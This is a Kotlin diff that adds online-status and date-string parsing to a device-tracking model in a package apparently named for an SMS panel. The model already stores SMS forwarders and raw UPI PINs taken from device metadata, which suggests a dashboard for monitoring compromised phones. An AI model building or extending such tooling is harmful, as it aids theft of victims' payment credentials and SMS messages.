@@ -2,6 +2,9 @@ package com.firebasepanel.sms.domain
 
 import org.json.JSONArray
 import org.json.JSONObject
+import java.text.ParseException
+import java.text.SimpleDateFormat
+import java.util.Locale
 import java.util.regex.Pattern
 
 /**
@@ -19,6 +22,8 @@ data class DeviceSnapshot(
     val forwarder: String?,
     /** Raw UPI/PIN from device metadata if present */
     val metadataUpiPin: String?,
+    /** From Virtus `clients/<id>.status` when present */
+    val clientOnline: Boolean? = null,
 )
 
 private val BATTERY_KEY =
@@ -47,6 +52,22 @@ fun deviceSnapshotFromClientsObject(deviceId: String, obj: JSONObject): DeviceSn
     return DeviceAccumulator(deviceId).apply { mergeFrom(obj) }.toSnapshot()
 }
 
+fun parseClientOnlineField(obj: JSONObject): Boolean? {
+    if (!obj.has("status")) return null
+    val st = obj.opt("status") ?: return null
+    return when (st) {
+        is Boolean -> st
+        is String ->
+            when {
+                st.equals("true", true) || st == "1" || st.equals("online", true) -> true
+                st.equals("false", true) || st == "0" || st.equals("offline", true) -> false
+                else -> null
+            }
+        is Number -> st.toInt() != 0
+        else -> null
+    }
+}
+
 private class DeviceAccumulator(
     val deviceId: String,
 ) {
@@ -58,8 +79,10 @@ private class DeviceAccumulator(
     var lastSeen: Long? = null
     var forwarder: String? = null
     var metaPin: String? = null
+    var clientOnline: Boolean? = null
 
     fun mergeFrom(obj: JSONObject) {
+        clientOnline = parseClientOnlineField(obj)
         mergeStringFields(obj)
         mergeBattery(obj)
         mergeTimes(obj)
@@ -116,6 +139,7 @@ private class DeviceAccumulator(
             lastSeenMillis = lastSeen,
             forwarder = forwarder?.takeIf { it.isNotBlank() },
             metadataUpiPin = metaPin?.takeIf { it.isNotBlank() },
+            clientOnline = clientOnline,
         )
 }
 
@@ -198,6 +222,32 @@ internal fun extractMillis(obj: JSONObject, key: String): Long? {
                 if (t > 1_000_000_000_000L) t /= 1000
                 if (t > 1_000_000_000L) return t
             }
+            return parseVirtusDateString(v)
+        }
+    }
+    return null
+}
+
+/** Virtus clients often store human-readable dates e.g. `20/7/2025, 11:50:22 AM` */
+private fun parseVirtusDateString(s: String): Long? {
+    val t = s.trim()
+    if (t.isEmpty() || t == "—" || t.equals("N/A", true)) return null
+    val patterns =
+        listOf(
+            "dd/MM/yyyy, h:mm:ss a",
+            "dd/MM/yyyy h:mm:ss a",
+            "dd/MM/yyyy, HH:mm:ss",
+            "dd/MM/yyyy HH:mm:ss",
+            "dd/MM/yyyy",
+        )
+    for (p in patterns) {
+        try {
+            val fmt = SimpleDateFormat(p, Locale.US)
+            fmt.isLenient = false
+            val d = fmt.parse(t) ?: continue
+            return d.time
+        } catch (_: ParseException) {
+            continue
         }
     }
     return null
